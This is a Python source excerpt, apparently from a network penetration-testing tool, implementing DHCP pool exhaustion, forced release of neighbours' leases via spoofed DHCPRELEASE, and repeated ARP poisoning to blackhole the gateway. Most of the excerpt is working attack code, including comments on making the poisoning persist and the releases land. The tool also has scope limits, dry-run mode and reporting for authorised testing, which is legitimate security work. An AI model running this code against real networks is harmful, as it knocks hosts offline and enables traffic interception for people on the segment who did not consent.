    def _note_offer_for_duplicate_detection(self, offered_ip: str, mac: str) -> None:
        """Same address offered to two of our MACs — the pending-offer-table saturation
        signature from the run that motivated this rewrite (flooding faster than handshakes
        could complete)."""
        macs = self._offered_ip_macs.setdefault(offered_ip, set())
        macs.add(mac)
        if len(macs) > 1 and offered_ip not in self._duplicate_offer_ips:
            self._duplicate_offer_ips.add(offered_ip)
            self._shrink_window("duplicate_offer")
            if len(self._duplicate_offer_ips) >= 3:
                self._trigger_halt(
                    "duplicate_offers",
                    f"{len(self._duplicate_offer_ips)} address(es) offered to more than one "
                    "of our MACs",
                )

    # ---------------------------------------------------------------- run loops
    def _run_exhaust(self) -> None:
        # dry-run is fully offline: no sniffer (no OFFERs would arrive), so it needs no root.
        if not self.cfg.dry_run:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_dhcp)
            self._sniffer.start()
            self._debug(f"sniffer started on {self.cfg.interface} (filter: dhcp/arp/icmp)")
            # Prelude (inventory + controls) runs off-thread so start() returns immediately and
            # the UI streams progress instead of blocking the HTTP request for ~10s.
            t = threading.Thread(target=self._exhaust_prelude, daemon=True)
            t.start()
            self._threads.append(t)
            return
        self._debug("dry-run: sniffer disabled (no packets sent or received)")
        self._start_senders()

    def _exhaust_prelude(self) -> None:
        """Baseline the segment, release what's there, then hand off to the senders.

        Order matters:
          1. ARP inventory — who was on the network *before* we touched it.
          2. control/self — proves DHCP is reachable and (as a side effect) learns the real
             server's identity, which the release phase needs.
          3. control/new — the baseline the final verdict is judged against.
          4. release phase — free the leases of hosts we just inventoried, so "take every
             address in the range" has somewhere to go rather than only mopping up whatever
             was already free.
          5. senders.
        Without the baselines a null result at the end can't be interpreted.
        """
        if self.cfg.arp_sweep:
            self._baseline_arp_scan()
        if not self._stop.is_set():
            self.control_pre = self._control_transaction("pre", client="self")
            self.control_pre_new = self._control_transaction("pre", client="new")
        if not self._stop.is_set():
            self._release_phase()
        if not self._stop.is_set():
            self._start_senders()

    def _release_phase(self) -> None:
        """Release the leases of every ARP-discovered neighbor before exhausting.

        Needs a real server identity — sourced from `control_pre`, never guessed — or every
        RELEASE would carry server_id=0.0.0.0 and be silently dropped (the bug this phase
        exists to not repeat). Skips itself with a Debug, rather than sending garbage, when
        that identity isn't available.
        """
        if not self.cfg.release_neighbors:
            self._debug("release phase skipped: release_neighbors is disabled")
            return
        pre = self.control_pre
        if pre is None or not pre.success or not pre.server_id:
            self._debug(
                "release phase skipped: no confirmed server identity yet "
                f"(pre_ok={bool(pre and pre.success)})"
            )
            return
        server_id, server_mac = pre.server_id, pre.server_mac
        neighbors = [
            n
            for n in self._neighbors_by_mac.values()
            if n.ip not in (server_id, self._release_gateway())
        ]
        if not neighbors:
            self._debug("release phase: no ARP-discovered neighbors to release")
            return
        self._debug(
            f"release phase: sending DHCPRELEASE for {len(neighbors)} neighbor(s) via "
            f"server {server_id} ({server_mac or 'MAC unknown, broadcasting'})"
        )
        sent = self._do_release(neighbors, server_id, server_mac=server_mac)
        stopped = self._reprobe_released(neighbors)
        self._debug(
            f"release phase: {sent} RELEASE sent, {stopped}/{len(neighbors)} target(s) "
            "stopped answering ARP afterward"
        )
        self._raise(
            Finding(
                id="NEIGHBOR_LEASES_RELEASED",
                title="Sent DHCPRELEASE for ARP-discovered neighbors before exhausting",
                verdict=INFO,
                severity="medium",
                evidence={
                    "targets": len(neighbors),
                    "released_sent": sent,
                    "stopped_answering_arp": stopped,
                    "server_id": server_id,
                },
                recommendation=(
                    "The server appears to ignore unauthenticated RELEASE from a third party "
                    "(the desired behavior)."
                    if stopped == 0
                    else "The server acted on unauthenticated RELEASE requests for addresses "
                    "held by other hosts on the segment — any host can force another off its "
                    "lease. This is independent of pool exhaustion and worth reporting on its "
                    "own; verify DHCP snooping / binding validation on the access switch."
                ),
            )
        )

    def _release_gateway(self) -> str | None:
        from .netutils import default_gateway

        return default_gateway(self.cfg.interface)

    def _reprobe_released(self, neighbors: list[Neighbor]) -> int:
        """Re-ARP the just-released addresses; count how many stopped answering.

        Servers vary in whether they honour an unauthenticated RELEASE, so report the observed
        effect rather than assume frames-sent implies addresses-freed.
        """
        if self.cfg.dry_run or not neighbors:
            return 0
        time.sleep(1.0)  # give hosts/switch a moment before re-probing
        cidrs = [f"{n.ip}/32" for n in neighbors]
        still_present, _ = self._discover_neighbors(cidrs)
        still_ips = {n.ip for n in still_present}
        return sum(1 for n in neighbors if n.ip not in still_ips)

    def _baseline_arp_scan(self) -> None:
        """ARP-sweep the segment for a pre-run inventory of live hosts."""
        cidrs = self._sweep_cidrs()
        if not cidrs:
            self._debug("arp sweep skipped: could not determine a network range for the interface")
            return
        self._debug(f"arp sweep starting over {', '.join(cidrs)} (pre-run inventory)")
        found, _ = self._discover_neighbors(cidrs)
        self._baseline_neighbor_count = len(found)
        self._debug(f"arp sweep: {len(found)} host(s) present before exhausting")

    def _sweep_cidrs(self) -> list[str]:
        """Range for the *non-destructive* baseline sweep: explicit scope, else the iface network.

        Destructive modes never use this — they stay pinned to cfg.scope_cidrs so their blast
        radius can't be widened by an inferred range.
        """
        if self.cfg.scope_cidrs:
            return list(self.cfg.scope_cidrs)
        from .netutils import iface_network_cidr

        cidr = iface_network_cidr(self.cfg.interface)
        return [cidr] if cidr else []

    def _start_senders(self) -> None:
        # single sender: --rate is the pacing control, so extra threads only fought the limiter
        t = threading.Thread(target=self._exhaust_sender, daemon=True)
        t.start()
        self._threads.append(t)

    def _exhaust_sender(self) -> None:
        """Bounded pipeline: at most `self._window` DISCOVER/REQUEST transactions in flight.

        Replaces the old open-loop flood. On the run that motivated this: DISCOVERs were sent
        faster than handshakes could complete, so half-open allocations piled up in the
        server's pending-offer table until it started re-offering the same address to two of
        our MACs and then NAKing — a self-inflicted stall that looked like exhaustion but
        wasn't. Only an ACK counts as a held address; NAKs, duplicate offers, and timeouts
        shrink the window instead of being pushed through.
        """
        from .netutils import random_mac

        macs = list(self.cfg.client_macs) if self.cfg.client_macs else None
        while not self._stop.is_set():
            if self._halt_signal is not None:
                return  # a control fired — stop sending, leases stay held for the report
            # Offers flowed and then stopped: the pool *looks* drained. Provisional until the
            # post-run control transaction confirms a real client is also denied — which we now
            # go and do ourselves rather than waiting for the operator to press Stop.
            silence = time.time() - self._last_offer_ts
            if self._offers_seen_any and silence > self.cfg.timeouts.offer_silence:
                self.bus.emit(
                    ev.PoolExhausted(
                        leases=self.acks,
                        elapsed=time.time() - self._started,
                        confirmed=False,
                    )
                )
                self._trigger_halt(
                    "offer_silence", f"no OFFER for {silence:.0f}s after {self.acks} lease(s)"
                )
                return
            if self._offers_seen_any and silence > 2.0 and not self._silence_noticed:
                self._silence_noticed = True
                self.bus.emit(
                    ev.OffersCeased(
                        quiet_for=silence,
                        leases=self.acks,
                        deadline=self.cfg.timeouts.offer_silence,
                    )
                )
            self._reap_timeouts()
            with self._inflight_lock:
                room = self._window - len(self._inflight)
            if room <= 0:
                if self._stop.wait(0.02):
                    return
                continue
            mac = macs.pop(0) if macs else random_mac()
            if macs is not None:
                macs.append(mac)  # rotate through the provided list
            xid = _rand_xid()
            src = self._src_mac(mac)
            pkt = packets.build_discover_v4(mac, xid, src)
            self._send(pkt)
            with self._inflight_lock:
                self._inflight[xid] = {"mac": mac, "sent_at": time.time(), "state": "DISCOVER_SENT"}
            self.discovers += 1
            self.bus.emit(ev.DiscoverSent(mac=mac))
            self._debug(
                f"DISCOVER xid=0x{xid:08x} chaddr={mac} eth_src={src} flags=0x8000 "
                f"window={self._window} inflight={len(self._inflight)}"
            )
            # No extra sleep here beyond the window/rate-limit checks above: a fixed per-packet
            # sleep was the old bug (capped throughput no matter what was asked for).

    def _on_dhcp(self, pkt) -> None:
        try:
            if self._consume_control(pkt):  # belongs to the in-flight control transaction
                return
            if packets.is_offer(pkt):
                self._handle_offer(pkt)
            elif packets.is_ack(pkt):
                self._handle_ack(pkt)
            elif packets.is_nak(pkt):
                self._handle_nak(pkt)
        except Exception as exc:  # never let a bad packet kill the sniffer thread
            self.bus.emit(ev.ErrorEvent(message=f"parse error: {exc!r}"))

    def _handle_offer(self, pkt) -> None:
        from scapy.all import BOOTP

        self.offers += 1
        self._offers_seen_any = True
        self._last_offer_ts = time.time()
        self._silence_noticed = False  # offers resumed; re-arm the quiet-period notice
        server_id, server_mac, offered_ip, subnet = packets.parse_offer(pkt)
        server = self.servers.get(server_id)
        if server is None:
            server = ServerInfo(server_id, server_mac, subnet, self.cfg.ip_version)
            fp = resolve(extract_signature(pkt, role="server"), role="server")
            fp.ip = server_id
            server.fingerprint = fp
            self.servers[server_id] = server
            self.bus.emit(ev.ServerDiscovered(server=server))
        server.offers_seen += 1
        xid = pkt[BOOTP].xid
        lease = Lease(
            packets.client_mac_from_offer(pkt),
            offered_ip,
            server_id,
            xid,
            self.cfg.ip_version,
        )
        with self._inflight_lock:
            info = self._inflight.get(xid)
            if info is not None:
                info["state"] = "REQUEST_SENT"
                info["sent_at"] = time.time()  # restart the timeout clock for the ACK leg
        self._note_offer_for_duplicate_detection(offered_ip, lease.mac)
        self._note_offer_for_pool_estimate(offered_ip, subnet)
        self.bus.emit(ev.OfferReceived(lease=lease, server=server))
        self._debug(
            f"OFFER xid=0x{pkt[BOOTP].xid:08x} yiaddr={offered_ip} server_id={server_id} "
            f"siaddr={pkt[BOOTP].siaddr} subnet={subnet} "
            f"chaddr={lease.mac} opts=[{_opts_summary(pkt)}]"
        )
        req = packets.build_request_v4(pkt, self._src_mac(lease.mac))
        self._send(req)
        self.bus.emit(ev.RequestSent(lease=lease))
        self._debug(
            f"REQUEST xid=0x{pkt[BOOTP].xid:08x} requested_addr={offered_ip} server_id={server_id}"
        )

    def _handle_ack(self, pkt) -> None:
        from scapy.all import BOOTP

        mac = packets.client_mac_from_offer(pkt)
        server_id, server_mac, ip, _ = packets.parse_offer(pkt)
        lease = Lease(
            mac,
            ip,
            server_id,
            pkt[BOOTP].xid,
            self.cfg.ip_version,
            acquired_at=time.time(),
            server_mac=server_mac or None,
        )
        self.cleanup.register(lease)
        self.acks += 1
        with self._inflight_lock:
            self._inflight.pop(pkt[BOOTP].xid, None)
        self._consecutive_timeouts = 0  # a clean handshake resets the timeout-storm counter
        self._grow_window()
        self.bus.emit(ev.AckReceived(lease=lease))
        self._debug(
            f"ACK xid=0x{pkt[BOOTP].xid:08x} yiaddr={ip} server_id={server_id} "
            f"chaddr={mac} lease#{self.acks} opts=[{_opts_summary(pkt)}]"
        )

    def _handle_nak(self, pkt) -> None:
        """DHCPNAK: the server refused. Meaningful evidence, previously dropped on the floor."""
        from scapy.all import BOOTP, DHCP

        self.naks += 1
        with self._inflight_lock:
            self._inflight.pop(pkt[BOOTP].xid, None)
        self._shrink_window("nak")
        self._note_nak_for_burst_detection()
        server_id = packets.server_identifier(pkt[BOOTP].siaddr, pkt[DHCP].options)
        self.bus.emit(ev.NakReceived(server_ip=server_id))
        self._debug(f"NAK xid=0x{pkt[BOOTP].xid:08x} from {server_id} opts=[{_opts_summary(pkt)}]")

    def _run_scan(self) -> None:
        # read-only: sniff + fingerprint. No DHCP REQUEST/RELEASE, no GARP.
        self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
        self._sniffer.start()

    def _on_scan(self, pkt) -> None:
        from scapy.all import ARP, DHCP, Ether

        try:
            if DHCP in pkt:
                role = "server" if packets.is_offer(pkt) or packets.is_ack(pkt) else "client"
                sig = extract_signature(pkt, role=role)
                fp = resolve(sig, role=role)
                if role == "client":
                    self._note_fingerprint(fp)  # may refresh an already-known neighbor row
                self.bus.emit(ev.HostFingerprinted(fp=fp))
                self._debug(
                    f"{role} {fp.mac} prl={sig.prl} vendor_class={sig.vendor_class!r} "
                    f"-> {fp.os or fp.device or '?'} ({fp.confidence}% via {fp.matched_via})"
                )
            elif ARP in pkt and pkt[ARP].op == 2:  # is-at
                self._note_neighbor(pkt[Ether].src, pkt[ARP].psrc)
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"scan parse error: {exc!r}"))

    def _run_active_scan(self) -> None:
        # active but non-destructive: ARP sweep + DHCP INFORM. Sniffer catches replies.
        if not self.cfg.dry_run:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
            self._sniffer.start()
            self._debug(f"active-scan sniffer started on {self.cfg.interface}")
        t = threading.Thread(target=self._active_scan_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _active_scan_worker(self) -> None:
        from .netutils import get_if_ip, random_mac

        neighbors, _ = self._discover_neighbors()  # benign ARP who-has across scope
        self._debug(f"active-scan: {len(neighbors)} host(s) responded to ARP")
        # Actively probe/fingerprint the DHCP server(s) with a single INFORM from our address.
        my_ip = get_if_ip(self.cfg.interface)
        if not my_ip or self.cfg.dry_run:
            my_ip = my_ip or "0.0.0.0"
        try:
            from scapy.all import get_if_hwaddr

            my_mac = get_if_hwaddr(self.cfg.interface)
        except Exception:
            my_mac = random_mac()
        xid = _rand_xid()
        inform = packets.build_inform_v4(my_mac, my_ip, xid, self.cfg.request_options)
        self._send(inform)
        self._debug(f"active-scan: sent DHCP INFORM ciaddr={my_ip} xid=0x{xid:08x}")
        # keep the sniffer collecting replies until stopped
        self._stop.wait()

    def _run_release(self) -> None:
        # discovery + release runs in a worker so start() returns promptly
        t = threading.Thread(target=self._release_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _release_worker(self) -> None:
        # no scope given -> fall back to the interface's own network
        neighbors, _ = self._discover_neighbors(self._sweep_cidrs())
        self._debug(f"release: {len(neighbors)} neighbor(s) discovered in scope")
        # _discover_neighbors is ARP-only and never learns a DHCP server identity. (BUG FIX,
        # 2.1) this mode used to send every RELEASE to 0.0.0.0, which no server honours — run a
        # quick self-MAC control cycle to learn the real server before sending anything. Not
        # optional: without it there is no way to target the RELEASE at a real server.
        pre = self._control_transaction("pre", client="self")
        self.control_pre = pre
        if not pre.success or not pre.server_id:
            self._debug(f"release: skipped — could not learn a server identity ({pre.reason})")
            return
        if not neighbors:
            self._debug("release: no neighbors to release")
            return
        sent = self._do_release(neighbors, pre.server_id, server_mac=pre.server_mac)
        self._debug(f"release: sent {sent} RELEASE via server {pre.server_id}")

    def _run_garp(self) -> None:
        # watch ARP while poisoning, so we can tell whether targets fight back
        if not self.cfg.dry_run:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_garp_arp)
            self._sniffer.start()
            self._debug(f"garp: ARP observer started on {self.cfg.interface}")
        t = threading.Thread(target=self._garp_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _on_garp_arp(self, pkt) -> None:
        """Record targets that re-announce their own address — i.e. they saw our forgery.

        A host defending its address (RFC 5227) proves our frame was delivered, which is the
        one thing we can establish from this vantage point. It does NOT prove the poisoning
        failed: hosts can defend and still have had their gateway entry overwritten.
        """
        from scapy.all import ARP, Ether

        try:
            if ARP not in pkt:
                return
            psrc, hwsrc = pkt[ARP].psrc, pkt[Ether].src if Ether in pkt else ""
            if psrc in self._garp_targets and hwsrc and hwsrc not in self._garp_bogus_macs:
                if psrc not in self._garp_defenders:
                    self._garp_defenders.add(psrc)
                    self._debug(
                        f"garp: {psrc} defended its address (ARP op={pkt[ARP].op} from {hwsrc}) "
                        f"— our frame reached it and the host answered"
                    )
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"garp observer error: {exc!r}"))

    def _garp_worker(self) -> None:
        """Sustained poisoning: repeat rounds until stopped.

        A single pass is why this used to look like it did nothing — hosts re-ARP within
        seconds and the legitimate owner answers, so one frame per victim is undone almost
        immediately. Re-poisoning on an interval is what keeps a forged mapping in place.
        """
        from .netutils import default_gateway

        cidrs = self._sweep_cidrs()
        self._debug(f"garp: discovering targets in {', '.join(cidrs) or '(no range)'}")
        neighbors, _ = self._discover_neighbors(cidrs)
        gateway = default_gateway(self.cfg.interface)
        targets = [n for n in neighbors if n.ip != gateway]
        self._garp_targets = {n.ip for n in targets}

        self._debug(
            f"garp: {len(neighbors)} host(s) found, {len(targets)} target(s) after excluding "
            f"the gateway; gateway={gateway or 'unknown'}"
        )
        for n in targets:
            fp = n.fingerprint
            who = (fp.device or fp.vendor) if fp else None
            self._debug(f"garp target: {n.ip} : {n.mac}" + (f"  [{who}]" if who else ""))
        if not targets:
            self._debug("garp: no targets — nothing to do")
            self._finish_in_background("no garp targets")
            return
        if not gateway:
            self._debug(
                "garp: no default gateway found — sending announcements only. Without a gateway "
                "to blackhole, hosts typically just defend their address and stay online."
            )

        rounds = 0
        interval = self.cfg.timeouts.garp_interval
        while not self._stop.is_set():
            rounds += 1
            sent = self._do_garp(targets, gateway=gateway)
            self._debug(
                f"garp round {rounds}: {sent} frame(s) over {len(targets)} target(s); "
                f"{len(self._garp_defenders)} host(s) have defended so far; "
                f"next round in {interval:g}s"
            )
            if self._stop.wait(interval):
                break

    def _discover_neighbors(
        self, cidrs: list[str] | None = None
    ) -> tuple[list[Neighbor], str | None]:
        """ARP-sweep for live neighbors (best effort; needs a real iface).

        `cidrs` defaults to cfg.scope_cidrs. Destructive callers MUST leave it unset so their
        targets stay pinned to the authorised scope.
        """
        import ipaddress

        from scapy.all import ARP, Ether, srp

        from .netutils import get_if_ip

        found: dict[str, Neighbor] = {}
        src_ip = get_if_ip(self.cfg.interface) or "0.0.0.0"
        targets: list[str] = []
        for cidr in (cidrs if cidrs is not None else self.cfg.scope_cidrs) or []:
            net = ipaddress.ip_network(cidr, strict=False)
            targets += [str(h) for h in list(net.hosts())[:1024]]
        if not targets or self.cfg.dry_run:
            return list(found.values()), None
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=targets, psrc=src_ip),
                timeout=2,
                iface=self.cfg.interface,
                verbose=False,
            )
            for _, r in ans:
                found[r.psrc] = self._note_neighbor(r.hwsrc, r.psrc)
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"arp sweep error: {exc!r}"))
        return list(found.values()), None


def _rand_xid() -> int:
    import random

    return random.randint(1, 900000000)


def _opts_summary(pkt) -> str:
    """Compact 'name=value' dump of DHCP options for debug logging (skips pad/end)."""
    from scapy.all import DHCP

    if DHCP not in pkt:
        return ""
    parts: list[str] = []
    for o in pkt[DHCP].options:
        if isinstance(o, str):
            if o in ("end", "pad"):
                continue
            parts.append(o)
        elif isinstance(o, tuple):
            val = o[1] if len(o) == 2 else list(o[1:])
            parts.append(f"{o[0]}={val}")
    return " ".join(parts)
